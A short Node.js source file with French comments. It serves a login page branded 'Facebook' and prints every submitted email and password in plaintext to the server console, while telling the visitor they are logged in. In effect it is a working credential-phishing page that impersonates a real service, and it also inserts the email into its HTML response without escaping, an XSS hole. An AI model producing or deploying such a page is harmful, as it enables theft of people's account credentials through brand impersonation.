const http = require('http');
const fs = require('fs');
const path = require('path');
const { parse } = require('querystring');

// Créer un serveur HTTP
const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/submit') {
    let body = '';

    // Récupérer les données en morceaux
    req.on('data', chunk => {
      body += chunk.toString();
    });

    // Quand toutes les données sont reçues
    req.on('end', () => {
      // Convertir les données en objet
      const parsedData = new URLSearchParams(body);
      const email = parsedData.get('email');
      const password = parsedData.get('password');

      console.log('Données reçues :', { email, password });

      // Réponse au client
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`<h1>Merci ! Vous êtes connecté avec l'email : ${email}</h1>`);
    });
  } else {
    // Retourner un formulaire HTML de connexion
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Formulaire de connexion</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
          }

          .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
          }

          h1 {
            text-align: center;
            margin-bottom: 20px;
            color:rgba(0,0,255,0.5);,
          }

          label {
            font-size: 14px;
            margin-bottom: 5px;
            display: block;
          }

          input[type="email"],
          input[type="password"],
          button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
          }

          button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
          }

          button:hover {
            background-color: #45a049;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Facebook </h1>
          <form method="POST" action="/submit">
            <label for="email">Email :</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Mot de passe :</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Se connecter</button>
          </form>
        </div>
      </body>
      </html>
    `);
  }
});

// Démarrer le serveur
const PORT = 3000;
server.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});